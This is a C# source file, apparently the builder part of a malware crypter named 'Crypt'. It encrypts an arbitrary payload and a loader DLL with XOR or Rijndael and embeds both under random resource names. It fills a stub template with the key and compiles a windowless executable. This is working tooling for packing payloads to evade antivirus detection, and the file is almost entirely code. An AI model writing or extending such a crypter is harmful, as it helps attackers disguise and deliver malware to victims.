using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;

namespace Crypt
{
    class Builder
    {
        Byte[] payload;
        Options options;
        string loaderPath;

        public Builder(byte[] payload, Options options)
        {
            this.payload = payload;
            this.options = options;

            //Super hacky
            //TODO: Find better way to access Loader.dll
#if DEBUG
            loaderPath = @"..\..\..\Loader\bin\Debug\Loader.dll";
#else
            loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
#endif
        }

        public bool Build()
        {
            options.encryptionKey = Encryption.GenerateKey();
            options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
            options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
            options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);

            Byte[] encPayload = Encrypt(payload);
            Byte[] encLoader = Encrypt(File.ReadAllBytes(loaderPath));
            string stubSrc = AddInfo(Properties.Resources.Stub);

            bool result = Compile(encPayload, encLoader, stubSrc);
            return result;
        }

        private byte[] Encrypt(Byte[] input)
        {
            Byte[] encryptedPL;
            switch (options.encryptionType)
            {
                case EncryptionType.Rijndael:
                    encryptedPL = Encryption.RijndaelEncrypt(input, options.encryptionKey);
                    break;
                case EncryptionType.XOR:
                default:
                    encryptedPL = Encryption.Xor(input, options.encryptionKey);
                    break;
            }

            return encryptedPL;
        }

        private string AddInfo(string stubSrc)
        {
            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(options.encryptionKey));
            newStub = newStub.Replace("[resFileName]", options.resFileName);
            newStub = newStub.Replace("[resPayloadName]", options.resPayloadName);
            newStub = newStub.Replace("[resLoaderName]", options.resLoaderName);

            return newStub;
        }

        private string CreateResource(byte[] encPayload, byte[] encLoader)
        {
            string resourceDir = options.resFileName + ".resources";
            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
            {
                resourceWriter.AddResource(options.resPayloadName, encPayload);
                resourceWriter.AddResource(options.resLoaderName, encLoader);
                resourceWriter.Generate();
            }
            return resourceDir;
        }

        private bool Compile(byte[] encPayload, byte[] encLoader, string stubSrc)
        {
            CompilerParameters compParams = new CompilerParameters();
            compParams.GenerateExecutable = true;
            compParams.TreatWarningsAsErrors = false;
            compParams.OutputAssembly = options.buildDir;
            compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";

            compParams.ReferencedAssemblies.Add("System.dll");
            compParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compParams.ReferencedAssemblies.Add("System.Drawing.dll");

            string resourceDir = CreateResource(encPayload, encLoader);
            compParams.EmbeddedResources.Add(resourceDir);

            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");

            CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);

            File.Delete(resourceDir);

            return !compResults.Errors.HasErrors;
        }
    }
}
